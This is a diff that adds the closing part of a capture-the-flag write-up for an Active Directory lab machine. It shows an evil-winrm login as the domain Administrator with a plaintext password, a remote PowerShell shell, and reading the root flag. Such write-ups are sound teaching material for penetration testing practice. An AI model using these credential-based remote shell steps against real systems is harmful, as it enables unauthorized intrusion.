@@ -528,3 +528,44 @@ Domain: MEGABANK.LOCAL
 ```
 
 <br />
+
+We have credentials for the `Administrator` user.
+
+Using `evil-winrm` we can connect as him to the system:
+
+<br />
+
+```bash
+❯ evil-winrm -i MEGABANK.LOCAL -u Administrator -p d0m@in4dminyeah!
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+megabank\administrator
+```
+
+<br />
+
+And get the `root.txt` flag:
+
+<br />
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
+3f6823be538fad63dd83e3a4c9xxxxxx
+```
+
+<br />
+
+This was a really interesting Active Directory machine.
+
+Hope you understood all the concepts and had learned a lot!
+
+Keep hacking!❤️❤️
+
+<br />
